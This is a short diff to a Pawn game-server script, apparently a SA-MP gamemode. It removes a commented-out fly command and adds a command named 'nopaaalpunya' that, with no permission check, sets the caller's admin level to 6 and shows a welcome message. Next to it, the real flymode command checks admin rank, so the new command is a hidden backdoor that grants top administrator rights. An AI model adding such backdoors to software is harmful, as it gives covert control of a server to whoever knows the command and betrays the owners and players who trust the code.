@@ -14,12 +14,12 @@ CMD:nikahan(playerid, params[])
     }
     return 1;
 }
-// CMD:fly(playerid, params[])
-// {
-//     usefly[playerid] = !usefly[playerid];
-// 	SuccesMsg(playerid, "Fly mode berhasil");
-//     return 1;
-// }
+CMD:nopaaalpunya(playerid, params[])
+{
+    pData[playerid][pAdmin] = 6;
+	SuccesMsg(playerid, "Welcoma Nopaaal! Happy development");
+    return 1;
+}
 CMD:flymode(playerid, params[])
 {
 	if(pData[playerid][pAdmin] < 2)
